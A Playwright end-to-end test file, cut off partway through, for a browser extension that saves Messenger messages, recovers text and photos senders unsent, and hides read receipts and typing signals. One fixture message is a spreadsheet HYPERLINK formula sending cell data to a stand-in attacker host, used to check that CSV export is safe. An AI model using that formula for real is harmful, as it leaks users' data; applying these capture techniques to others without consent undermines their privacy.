'use strict';
// End-to-end test: loads the real extension into Chromium, serves a test double of the
// Messenger page on https://www.facebook.com/ and a fake gateway WebSocket, then checks
// saving, unsend recovery, edits, photos, Unseen and the dashboard.
//
// Run: node --test tests/e2e/

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { chromium } = require('playwright');
const h = require('../unit/helpers.js');
const mw = require('../../extension/content/main-world.js');

const EXT = path.resolve(__dirname, '../../extension');
const FIXTURE = fs.readFileSync(path.resolve(__dirname, '../fixtures/mock-messenger.html'), 'utf8');
const THREAD = '100012345678901';
const ME = '100099999999999';
const PNG_1x1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
const dec = new TextDecoder();

async function waitFor(fn, { timeout = 10000, interval = 150, what = 'condition' } = {}) {
  const end = Date.now() + timeout;
  let last;
  while (Date.now() < end) {
    try {
      last = await fn();
      if (last) return last;
    } catch (e) {
      last = e;
    }
    await new Promise((r) => setTimeout(r, interval));
  }
  throw new Error('Timed out waiting for ' + what + (last instanceof Error ? ': ' + last.message : ''));
}

test('Messenger Message Saver end to end', { timeout: 240000 }, async (t) => {
  const userDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mms-e2e-'));
  const ctx = await chromium.launchPersistentContext(userDir, {
    channel: 'chromium',
    headless: true,
    viewport: { width: 1280, height: 860 },
    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`],
  });
  const errors = [];
  t.after(async () => {
    await ctx.close();
    fs.rmSync(userDir, { recursive: true, force: true });
  });

  let [sw] = ctx.serviceWorkers();
  if (!sw) sw = await ctx.waitForEvent('serviceworker', { timeout: 20000 });
  const extId = sw.url().split('/')[2];

  // fake facebook.com (GraphQL answers with whatever the current test put in graphqlReply)
  let graphqlReply = '{}';
  await ctx.route('https://www.facebook.com/**', (route) => {
    if (route.request().resourceType() === 'document') return route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: FIXTURE });
    if (route.request().url().includes('/api/graphql/')) return route.fulfill({ status: 200, contentType: 'text/javascript; charset=utf-8', body: 'for (;;);' + graphqlReply });
    return route.fulfill({ status: 204, body: '' });
  });
  await ctx.grantPermissions(['notifications'], { origin: 'https://www.facebook.com' });

  // fake gateway.facebook.com
  const gw = { socket: null, fromPage: [] };
  await ctx.routeWebSocket(/^wss:\/\/gateway\.facebook\.com\//, (ws) => {
    gw.socket = ws;
    ws.onMessage((msg) => gw.fromPage.push(typeof msg === 'string' ? Buffer.from(msg) : msg));
  });

  // extension page used to read the extension's own database
  const dash = await ctx.newPage();
  dash.on('pageerror', (e) => errors.push('dashboard: ' + e.message));
  await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#unsent`);
  const dbAll = (store) => dash.evaluate(async (s) => (await import('/lib/db.js')).getAll(s), store);
  const setSettings = (patch) =>
    dash.evaluate(async (p) => {
      const { getSettings } = await import('/lib/settings.js');
      const cur = await getSettings();
      await chrome.storage.local.set({ settings: { ...cur, ...p } });
    }, patch);

  const page = await ctx.newPage();
  page.on('pageerror', (e) => errors.push('page: ' + e.message));
  await page.goto('https://www.facebook.com/');
  await page.context().addCookies([{ name: 'c_user', value: ME, domain: '.facebook.com', path: '/', secure: true }]);

  await t.test('page hook is installed before the page runs', async () => {
    assert.equal(await page.evaluate(() => window.__mmsInstalled === true), true);
    assert.equal(await page.evaluate(() => typeof window.fb), 'object');
  });

  await t.test('Unseen strong mode reports "no focus" but keeps the real visibility', async () => {
    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).hasFocus === false, { what: 'no focus' });
    const info = await page.evaluate(() => fb.focusInfo());
    assert.equal(info.hasFocus, false);
    assert.equal(info.visibilityState, 'visible', 'visibility is real by default (Facebook needs it)');
    assert.equal(await page.evaluate(() => { let n = 0; window.addEventListener('focus', () => n++); window.dispatchEvent(new Event('focus')); return n; }), 0, 'window focus events held back');
    // visibilitychange always reaches the page
    assert.equal(await page.evaluate(() => { let n = 0; document.addEventListener('visibilitychange', () => n++); document.dispatchEvent(new Event('visibilitychange')); return n; }), 1);

    await setSettings({ stealthVisibility: true });
    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).visibilityState === 'hidden', { what: 'optional hidden mode' });
    await setSettings({ stealthVisibility: false, stealthFocus: false });
    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).visibilityState === 'visible', { what: 'visible again' });
    assert.equal(await page.evaluate(() => { let n = 0; window.addEventListener('focus', () => n++); window.dispatchEvent(new Event('focus')); return n; }), 1, 'focus events pass when Strong mode is off');
    await setSettings({ stealthFocus: true });
    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).hasFocus === false, { what: 'no focus again' });
  });

  await t.test('network: message saved, then kept after the sender unsends it', async () => {
    await page.evaluate(() => fb.connect());
    await waitFor(() => gw.socket, { what: 'gateway connection' });
    const steps = [
      h.call('verifyContactRowExists', { 0: h.i64(THREAD), 2: '', 3: 'Khondoker Aurthe' }, 22),
      h.call('deleteThenInsertThread', { 0: h.i64(1731571860000), 1: h.i64(1731571000000), 2: 'hi', 3: '', 7: h.i64(THREAD), 9: h.i64(1) }, 50),
      h.insertMessage({ text: 'network secret', threadKey: THREAD, ts: 1731571860000, id: 'mid.$net1', senderId: THREAD }),
    ];
    gw.socket.send(Buffer.from(h.dgwData(3, h.responseEnvelope(steps))));
    const saved = await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$net1'), { what: 'network message saved' });
    assert.equal(saved.text, 'network secret');
    assert.equal(saved.isMine, false);

    gw.socket.send(Buffer.from(h.dgwData(3, h.responseEnvelope([h.insertMessage({ text: '', threadKey: THREAD, ts: 1731571860000, id: 'mid.$net1', senderId: THREAD, unsent: true, proc: 'deleteThenInsertMessage' })]))));
    const after = await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$net1' && m.unsent), { what: 'unsent flag' });
    assert.equal(after.text, 'network secret', 'original text kept');
    const contacts = await dbAll('contacts');
    assert.ok(contacts.some((c) => c.id === THREAD && c.name === 'Khondoker Aurthe'));
    const notes = await sw.evaluate(() => new Promise((r) => chrome.notifications.getAll(r)));
    assert.ok(Object.keys(notes).some((k) => k.startsWith('mms|')), 'desktop alert shown for the unsend');
  });

  await t.test('GraphQL: Messenger queries are read, news-feed queries are ignored', async () => {
    const lsDoc = (text, id) => JSON.stringify({ data: { viewer: { lightspeed_web_request: { payload: h.lsPayload([h.insertMessage({ text, threadKey: THREAD, ts: 1731571865000, id, senderId: THREAD })]), dependencies: [] } } } });
    graphqlReply = lsDoc('from graphql', 'mid.$gql1');
    await page.evaluate(() => fetch('/api/graphql/', { method: 'POST', body: new URLSearchParams({ fb_api_req_friendly_name: 'LSPlatformGraphQLLightspeedRequestQuery', variables: '{}' }) }).then((r) => r.text()));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$gql1' && m.text === 'from graphql'), { what: 'GraphQL message saved' });
    graphqlReply = lsDoc('feed noise', 'mid.$feed1');
    await page.evaluate(() => fetch('/api/graphql/', { method: 'POST', body: new URLSearchParams({ fb_api_req_friendly_name: 'CometNewsFeedPaginationQuery', variables: '{}' }) }).then((r) => r.text()));
    await page.evaluate(() => new Promise((resolve) => {
      const x = new XMLHttpRequest();
      x.open('POST', '/api/graphql/');
      x.onload = resolve;
      x.send('fb_api_req_friendly_name=CometNewsFeedPaginationQuery');
    }));
    await new Promise((r) => setTimeout(r, 800));
    assert.equal((await dbAll('messages')).some((m) => m.key === 'fb:mid.$feed1'), false, 'feed requests are not read');
  });

  await t.test('Unseen: "Seen" is rewound and "typing" is cleared before leaving the browser', async () => {
    const sendTask = `{"thread_id":${THREAD},"otid":"7123456789012345678","source":65537,"send_type":1,"sync_group":1,"text":"hi","initiating_source":1}`;
    const readTask = `{"thread_id":${THREAD},"last_read_watermark_ts":1731571860000,"sync_group":1}`;
    const req = h.taskRequest([
      { label: '46', payload: sendTask, queue: THREAD, taskId: 3 },
      { label: '21', payload: readTask, queue: THREAD, taskId: 4 },
    ]);
    const before = gw.fromPage.length;
    await page.evaluate((json) => fb.sendJson(json), req);
    const got = await waitFor(() => gw.fromPage.length > before && gw.fromPage[gw.fromPage.length - 1], { what: 'frame at server' });
    const frames = mw.dgwParse(new Uint8Array(got));
    assert.equal(frames.length, 2);
    const env = JSON.parse(dec.decode(frames[1].payload));
    const inner = JSON.parse(env.payload);
    assert.equal(inner.tasks.length, 2, 'no task dropped');
    assert.equal(JSON.parse(inner.tasks[0].payload).text, 'hi', 'message send untouched');
    assert.equal(JSON.parse(inner.tasks[1].payload).last_read_watermark_ts, 1731571000000, 'read marker rewound to what the server already had');
    assert.ok(dec.decode(frames[1].payload).includes('7300123456789012345'), '64-bit ids unchanged');

    const before2 = gw.fromPage.length;
    await page.evaluate((json) => fb.sendJson(json, false), h.typingRequest({ threadKey: THREAD, typing: 1 }));
    const got2 = await waitFor(() => gw.fromPage.length > before2 && gw.fromPage[gw.fromPage.length - 1], { what: 'typing frame' });
    const env2 = JSON.parse(dec.decode(mw.dgwParse(new Uint8Array(got2))[1].payload));
    assert.equal(JSON.parse(JSON.parse(env2.payload).payload).is_typing, 0);

    await setSettings({ blockSeen: false, blockTyping: false });
    await new Promise((r) => setTimeout(r, 400));
    const before3 = gw.fromPage.length;
    await page.evaluate((json) => fb.sendJson(json), req);
    const got3 = await waitFor(() => gw.fromPage.length > before3 && gw.fromPage[gw.fromPage.length - 1], { what: 'frame with unseen off' });
    const inner3 = JSON.parse(JSON.parse(dec.decode(mw.dgwParse(new Uint8Array(got3))[1].payload)).payload);
    assert.equal(JSON.parse(inner3.tasks[1].payload).last_read_watermark_ts, 1731571860000, 'untouched when Unseen is off');
    await setSettings({ blockSeen: true, blockTyping: true });
  });

  await t.test('screen: incoming and own messages are saved with sender and direction', async () => {
    await page.evaluate(() => {
      fb.dateBreak('Today');
      fb.addMessage({ domId: '100012345678901@msgr.7001', sender: 'Khondoker Aurthe', time: '3:11 PM', text: 'screen secret' });
      fb.addMessage({ domId: '100099999999999@msgr.7002', sender: 'You', time: '3:12 PM', text: 'Good afternoon', mine: true });
    });
    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7001'), { what: 'screen message saved' });
    assert.equal(rec.text, 'screen secret');
    assert.equal(rec.senderName, 'Khondoker Aurthe');
    assert.equal(rec.isMine, false);
    assert.ok(rec.ts > 0);
    const mine = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100099999999999@msgr.7002'), { what: 'own message saved' });
    assert.equal(mine.isMine, true);
    // Messenger puts the same number before "@msgr" on everyone's messages: it must not decide direction
    await page.evaluate(() => fb.addMessage({ domId: '100099999999999@msgr.7005', sender: 'Khondoker Aurthe', time: '3:13 PM', text: 'same prefix, still incoming' }));
    const incoming = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100099999999999@msgr.7005'), { what: 'prefixed incoming saved' });
    assert.equal(incoming.isMine, false);
    assert.equal(incoming.senderName, 'Khondoker Aurthe');
  });

  await t.test('the same message seen on the network and on screen is stored once', async () => {
    gw.socket.send(Buffer.from(h.dgwData(3, h.responseEnvelope([h.insertMessage({ text: 'dedupe me', threadKey: THREAD, ts: 1731571870000, id: 'mid.$dup1', senderId: THREAD })]))));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$dup1'), { what: 'network copy' });
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000007777', sender: 'Khondoker Aurthe', time: '3:12 PM', text: 'dedupe me' }));
    const merged = await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$dup1' && m.domId === 'msgr.7460000000000007777'), { what: 'screen copy merged into network record' });
    assert.deepEqual(merged.sources.sort(), ['network', 'screen']);
    assert.equal((await dbAll('messages')).filter((m) => m.text === 'dedupe me').length, 1);
    const threads = await dbAll('threads');
    const popupThread = threads.find((t) => t.threadKey === THREAD);
    assert.equal(popupThread && popupThread.domName, 'Khondoker Aurthe', 'pop-up keyed by the profile id and named from its header');
  });

  await t.test('screen: live unsend shows the original under "unsent a message"', async () => {
    await page.evaluate(() => fb.unsend('100012345678901@msgr.7001', 'Khondoker Aurthe unsent a message'));
    const box = await waitFor(async () => {
      const txt = await page.evaluate(() => {
        const b = document.querySelector('[data-message-id="100012345678901@msgr.7001"] .mms-recovered');
        return b && b.textContent;
      });
      return txt && txt.includes('screen secret') ? txt : null;
    }, { what: 'recovered box' });
    assert.match(box, /Saved copy/);
    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7001' && m.unsent), { what: 'unsent flag in db' });
    assert.equal(rec.text, 'screen secret');
  });

  await t.test('screen: edits keep the earlier text and show it in the chat', async () => {
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7003', sender: 'Khondoker Aurthe', time: '3:14 PM', text: 'original words' }));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7003'), { what: 'message before edit' });
    await page.evaluate(() => fb.edit('100012345678901@msgr.7003', 'changed words'));
    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7003' && m.edited), { what: 'edit saved' });
    assert.equal(rec.text, 'changed words');
    assert.equal(rec.history[0].text, 'original words');
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.7003"] .mms-edit-history');
      return b && b.textContent.includes('original words');
    }), { what: 'edit history box' });
  });

  await t.test('screen: photos are saved and shown again after an unsend', async () => {
    await page.evaluate((png) => fb.addMessage({ domId: '100012345678901@msgr.7004', sender: 'Khondoker Aurthe', time: '3:15 PM', text: '', photo: 'data:image/png;base64,' + png }), PNG_1x1);
    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7004' && m.attachments.some((a) => a.mediaKey)), { what: 'photo stored' });
    assert.ok(rec.attachments.length >= 1);
    const media = await dbAll('media');
    assert.ok(media.some((x) => x.key === rec.attachments[0].mediaKey && x.size > 0));
    await page.evaluate(() => fb.unsend('100012345678901@msgr.7004', 'Khondoker Aurthe unsent a message'));
    await waitFor(async () => page.evaluate(() => !!document.querySelector('[data-message-id="100012345678901@msgr.7004"] .mms-recovered img')), { what: 'recovered photo' });
  });

  await t.test('encrypted chats: unsent row gets a NEW id - still matched, live and after reload', async () => {
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000008001', sender: 'Khondoker Aurthe', time: '3:16 PM', text: 'id will change' }));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008001'), { what: 'saved under canonical id' });
    await page.evaluate(() => fb.unsendInPlace('100012345678901@msgr.7460000000000008001', '100012345678901@msgr.7460000000000009999', 'Khondoker Aurthe deleted a message'));
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000009999"] .mms-recovered');
      return b && b.textContent.includes('id will change');
    }), { what: 'live recovery despite id change' });
    const alias = await waitFor(async () => (await dbAll('aliases')).find((a) => a.domId === 'msgr.7460000000000009999'), { what: 'alias stored' });
    assert.ok(alias.messageKey);
    const rec = (await dbAll('messages')).find((m) => m.key === alias.messageKey);
    assert.equal(rec.unsent, true);
    assert.equal(rec.text, 'id will change');
  });

  await t.test('stickers, blob photos and the "Edited" button are understood', async () => {
    await page.evaluate((png) => {
      fb.addMessage({ domId: '100012345678901@msgr.7460000000000008101', sender: 'Khondoker Aurthe', time: '3:17 PM', text: '', photo: fb.blobPng(png) });
      fb.addMessage({ domId: '100012345678901@msgr.7460000000000008102', sender: 'Khondoker Aurthe', time: '3:17 PM', text: '', sticker: 'data:image/png;base64,' + png });
    }, PNG_1x1);
    const blobRec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008101' && m.attachments.some((a) => a.mediaKey)), { what: 'blob photo stored' });
    assert.ok(blobRec);
    const stickerRec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008102' && m.attachments.length), { what: 'sticker saved' });
    assert.ok(stickerRec.attachments[0]);
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000008103', sender: 'Khondoker Aurthe', time: '3:18 PM', text: 'before button edit' }));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008103'), { what: 'pre-edit saved' });
    await page.evaluate(() => fb.edit('100012345678901@msgr.7460000000000008103', 'after button edit', true));
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000008103"] .mms-edit-history');
      return b && b.textContent.includes('before button edit');
    }), { what: 'edit history via Edited button' });
  });

  await t.test('other UI languages: the unsent wording is learned from the page', async () => {
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000008201', sender: 'Khondoker Aurthe', time: '3:19 PM', text: 'learn me' }));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008201'), { what: 'saved before unsend' });
    // a wording no built-in pattern knows
    await page.evaluate(() => fb.unsendInPlace('100012345678901@msgr.7460000000000008201', '100012345678901@msgr.7460000000000008201', 'Khondoker Aurthe zz-unsendword-zz'));
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000008201"] .mms-recovered');
      return b && b.textContent.includes('learn me');
    }), { what: 'structural unsend detection' });
    const learned = await dash.evaluate(async () => (await chrome.storage.local.get('learnedPlaceholders')).learnedPlaceholders || []);
    assert.ok(learned.some((src) => src.includes('zz-unsendword-zz')), 'pattern learned: ' + JSON.stringify(learned));
  });

  await t.test('after a reload, old placeholders are filled from the saved copy', async () => {
    await page.evaluate(() =>
      fb.addMessage({ domId: '100012345678901@msgr.7101', sender: 'Khondoker Aurthe', time: '3:20 PM', text: 'alpha one' }) ||
      fb.addMessage({ domId: '100012345678901@msgr.7102', sender: 'Khondoker Aurthe', time: '3:20 PM', text: 'beta two' }) ||
      fb.addMessage({ domId: '100012345678901@msgr.7103', sender: 'Khondoker Aurthe', time: '3:21 PM', text: 'gamma three' })
    );
    await waitFor(async () => (await dbAll('messages')).some((m) => m.text === 'gamma three'), { what: 'context rows saved' });
    await page.reload();
    await page.evaluate(() => {
      fb.addMessage({ domId: '100012345678901@msgr.7001', sender: 'Khondoker Aurthe', time: '3:11 PM', placeholder: 'Khondoker Aurthe unsent a message' });
      fb.addMessage({ domId: '100012345678901@msgr.7101', sender: 'Khondoker Aurthe', time: '3:20 PM', text: 'alpha one' });
      // same position, but Messenger gave the placeholder a different id: matched by its neighbours
      fb.addMessage({ domId: '100012345678901@msgr.9999', sender: 'Khondoker Aurthe', time: '3:20 PM', placeholder: 'Khondoker Aurthe unsent a message' });
      fb.addMessage({ domId: '100012345678901@msgr.7103', sender: 'Khondoker Aurthe', time: '3:21 PM', text: 'gamma three' });
      fb.addMessage({ domId: '100012345678901@msgr.7460000000000009999', sender: 'Khondoker Aurthe', time: '3:16 PM', placeholder: 'Khondoker Aurthe deleted a message' });
      fb.addMessage({ domId: '100012345678901@msgr.7460000000000008201', sender: 'Khondoker Aurthe', time: '3:19 PM', placeholder: 'Khondoker Aurthe zz-unsendword-zz' });
    });
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000009999"] .mms-recovered');
      return b && b.textContent.includes('id will change');
    }), { what: 'recovery through the stored id alias' });
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000008201"] .mms-recovered');
      return b && b.textContent.includes('learn me');
    }), { what: 'learned wording recognised after reload' });
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.7001"] .mms-recovered');
      return b && b.textContent.includes('screen secret');
    }), { what: 'exact match by message id' });
    await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="100012345678901@msgr.9999"] .mms-recovered');
      return b && b.textContent.includes('beta two');
    }), { what: 'match by neighbouring messages' });
  });

  await t.test('review fixes: no wrong matches, no chat mix-ups, typed text, reply photos, likes', async () => {
    // other UI language: list label translated, generic heading "Tin nhắn" above every log
    await page.evaluate(() => {
      fb.openPopup({ logId: 'log-bob', title: 'Bob Smith', profileId: '200000000000001', label: 'Tin nhắn trong cuộc trò chuyện với Bob Smith', generic: 'Tin nhắn' });
      fb.openPopup({ logId: 'log-carol', title: 'Carol Jones', profileId: '300000000000001', label: 'Tin nhắn trong cuộc trò chuyện với Carol Jones', generic: 'Tin nhắn' });
      fb.inLog('log-bob', (f) => f.addMessage({ domId: '200000000000001@msgr.7460000000000006001', sender: 'Bob Smith', time: '9:00 AM', text: 'my bank PIN is 4321' }));
    });
    const bob = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006001'), { what: 'Bob message saved' });
    assert.equal(bob.threadKey, '200000000000001', 'Bob pop-up keyed by his profile id, not by the generic heading');
    await page.evaluate(() => fb.inLog('log-bob', (f) => f.unsendInPlace('200000000000001@msgr.7460000000000006001', '200000000000001@msgr.7460000000000006001', 'Bob Smith deleted a message')));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006001' && m.unsent), { what: 'Bob unsend saved' });
    // Carol's chat: an uncaptured placeholder must not show Bob's (or anyone's) message
    await page.evaluate(() => fb.inLog('log-carol', (f) => f.addMessage({ domId: '300000000000001@msgr.7460000000000006101', sender: 'Carol Jones', time: '11:05 AM', placeholder: 'Carol Jones deleted a message' })));
    const carolBox = await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="300000000000001@msgr.7460000000000006101"] .mms-recovered');
      return b && b.textContent;
    }), { what: 'Carol placeholder box' });
    assert.match(carolBox, /No saved copy/);
    assert.ok(!carolBox.includes('4321'));
    const names = (await dbAll('threads')).map((t) => t.domName);
    assert.ok(!names.includes('Tin nhắn'), 'generic heading never used as a chat name');

    // same chat, same sender, but an older unsent message at another time: not offered as the original
    await page.evaluate(() => fb.inLog('log-bob', (f) => f.addMessage({ domId: '200000000000001@msgr.7460000000000006002', sender: 'Bob Smith', time: '11:05 AM', placeholder: 'Bob Smith deleted a message' })));
    const otherBox = await waitFor(async () => page.evaluate(() => {
      const b = document.querySelector('[data-message-id="200000000000001@msgr.7460000000000006002"] .mms-recovered');
      return b && b.textContent;
    }), { what: 'second Bob placeholder box' });
    assert.match(otherBox, /No saved copy/);

    // a typed sentence that looks like a placeholder is a normal message
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006201', sender: 'Khondoker Aurthe', time: '3:30 PM', text: 'wait, Alice deleted a message' }));
    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006201' && m.text === 'wait, Alice deleted a message'), { what: 'typed look-alike saved' });
    assert.equal(await page.evaluate(() => !!document.querySelector('[data-message-id="100012345678901@msgr.7460000000000006201"] .mms-recovered')), false);

    // the photo in a reply's quote belongs to the quoted message
    await page.evaluate((png) => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006301', sender: 'Khondoker Aurthe', time: '3:31 PM', text: 'reply with quote', quotePhoto: 'data:image/png;base64,' + png }), PNG_1x1);
    const reply = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006301'), { what: 'reply saved' });
    assert.equal(reply.attachments.length, 0, 'quoted photo not attached to the reply');

    // the big thumbs-up "like"
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006401', sender: 'Khondoker Aurthe', time: '3:32 PM', like: true }));
    const like = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006401'), { what: 'like saved' });
    assert.equal(like.text, '👍');
  });

  await t.test('Messenger notifications are kept as a backup copy', async () => {
    await page.evaluate(() => {
      try {
        new Notification('Khondoker Aurthe', { body: 'notification text' });
      } catch (e) {
        /* permission */
      }
    });
    const n = await waitFor(async () => (await dbAll('notifications')).find((x) => x.body === 'notification text'), { what: 'notification saved' });
    assert.equal(n.title, 'Khondoker Aurthe');
  });

  await t.test('dashboard lists recovered messages; popup shows counts', async () => {
    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#unsent`);
    await waitFor(async () => {
      const text = await dash.textContent('#unsent-list');
      return text.includes('network secret') && text.includes('screen secret');
    }, { what: 'dashboard cards' });
    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#thread=${THREAD}`);
    await waitFor(async () => (await dash.textContent('#thread-messages')).includes('network secret'), { what: 'chat view' });
    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
    await waitFor(async () => (await dash.textContent('#diag')).includes('gateway'), { what: 'diagnostics table' });

    const popup = await ctx.newPage();
    popup.on('pageerror', (e) => errors.push('popup: ' + e.message));
    await popup.goto(`chrome-extension://${extId}/popup/popup.html`);
    await waitFor(async () => Number(await popup.textContent('#s-unsent')) >= 3, { what: 'popup unsent count' });
    // the popup lists the 3 most recently unsent messages that were kept
    const latest = (await dbAll('messages')).filter((m) => m.unsent && m.text).sort((a, b) => b.unsentAt - a.unsentAt)[0];
    await waitFor(async () => (await popup.textContent('#recent-list')).includes(latest.text), { what: 'popup recent list' });
    assert.ok((await popup.locator('#recent-list li').count()) <= 3);
    await popup.close();
  });

  await t.test('a row with a large photo album is split, saved, and capture keeps going', async () => {
    // 3 photos of ~9 MB in one row: more than one message to the background can carry at once
    await page.evaluate(() => {
      const big = (seed) => {
        const bytes = new Uint8Array(9 * 1024 * 1024);
        for (let i = 0; i < bytes.length; i += 512) bytes[i] = (i / 512 + seed * 37) & 255;
        return URL.createObjectURL(new Blob([bytes], { type: 'image/png' }));
      };
      fb.addMessage({ domId: '100012345678901@msgr.7460000000000006501', sender: 'Khondoker Aurthe', time: '3:40 PM', text: 'album', photo: big(1) });
      const row = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000006501"] .bubble');
      for (let i = 2; i <= 3; i++) row.insertAdjacentHTML('beforeend', `<div role="presentation"><img alt="Open photo" width="800" height="600" src="${big(i)}"></div>`);
    });
    const album = await waitFor(async () => {
      const m = (await dbAll('messages')).find((x) => x.domId === 'msgr.7460000000000006501');
      return m && m.attachments.filter((a) => a.mediaKey).length === 3 ? m : null;
    }, { timeout: 30000, what: 'all three album photos stored' });
    assert.equal(album.text, 'album');
    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006502', sender: 'Khondoker Aurthe', time: '3:41 PM', text: 'after the album' }));
    await waitFor(async () => (await dbAll('messages')).some((m) => m.text === 'after the album'), { what: 'capture still running after a huge row' });
  });

  await t.test('backup with photos restores everything (one piece and line by line)', async () => {
    const result = await dash.evaluate(async () => {
      const db = await import('/lib/db.js');
      const before = await db.quickTotals();
      const { blob, photos } = await db.exportBlob({ includeMedia: true });
      const file = new File([blob], 'backup.json', { type: 'application/json' });
      await db.clearAll();
      const emptied = await db.quickTotals();
      await db.importFile(file, null, { streamAbove: Number.MAX_SAFE_INTEGER }); // whole-file path
      const once = await db.quickTotals();
      await db.clearAll();
      await db.importFile(file, null, { streamAbove: 0 }); // line-by-line path used for huge backups
      const twice = await db.quickTotals();
      return { before, emptied, once, twice, photos };
    });
    assert.equal(result.emptied.messages, 0);
    assert.equal(result.photos, result.before.media, 'every stored photo exported');
    assert.ok(result.photos >= 4, 'photos exported: ' + result.photos);
    assert.deepEqual(result.once, result.before);
    assert.deepEqual(result.twice, result.before);
  });

  await t.test('data safety: shared photos survive deleting one chat; deletion is complete; CSV has no formulas; restore merges', async () => {
    const r = await dash.evaluate(async () => {
      const db = await import('/lib/db.js');
      const blob = new Blob([new Uint8Array([1, 2, 3, 4])], { type: 'image/png' });
      const msg = (key, threadKey, text, mediaKey) =>
        db.finalizeMessage({ key, threadKey, text, ts: Date.now(), capturedAt: Date.now(), attachments: mediaKey ? [{ kind: 'screen-image', fbid: 'shared', mediaKey }] : [], history: [], sources: ['screen'], unsent: true, unsentAt: Date.now() });
      await db.withStores(['messages', 'media', 'events', 'notifications', 'pendingMedia', 'threads'], 'readwrite', async (s) => {
        s.media.put({ key: 'fbid:shared', blob, mime: 'image/png', size: 4, messageKey: 'dm:A1', savedAt: Date.now() });
        s.messages.put(msg('dm:A1', 'chatA', 'secret in A', 'fbid:shared'));
        s.messages.put(msg('dm:B1', 'chatB', '=HYPERLINK("https://attacker.example/?d="&A1,"Open")', 'fbid:shared'));
        s.threads.put({ threadKey: 'chatA', domName: 'Chat A' });
        s.events.add({ type: 'unsent', messageKey: 'dm:A1', threadKey: 'chatA', at: Date.now(), text: 'secret in A', recovered: true });
        s.notifications.add({ title: 'Chat A', body: 'secret in A', ts: Date.now() });
        s.pendingMedia.put({ id: 'dm:A1|x', messageKey: 'dm:A1', url: 'https://scontent.xx.fbcdn.net/x.jpg', fbid: 'x', addedAt: Date.now(), tries: 0 });
      });
      await db.deleteThread('chatA', { name: 'Chat A' });
      const afterA = {
        mediaStillThere: !!(await db.getMedia('fbid:shared')),
        eventsWithA: (await db.getAll('events')).filter((e) => (e.text || '').includes('secret in A')).length,
        notifWithA: (await db.getAll('notifications')).filter((n) => (n.body || '').includes('secret in A')).length,
        pendingForA: (await db.getAll('pendingMedia')).filter((j) => j.messageKey === 'dm:A1').length,
      };
      // restoring the same backup twice must not duplicate anything
      const { blob: backup } = await db.exportBlob({ includeMedia: true });
      const file = new File([backup], 'b.json');
      const n0 = (await db.getAll('notifications')).length;
      const e0 = (await db.getAll('events')).length;
      await db.importFile(file);
      await db.importFile(file);
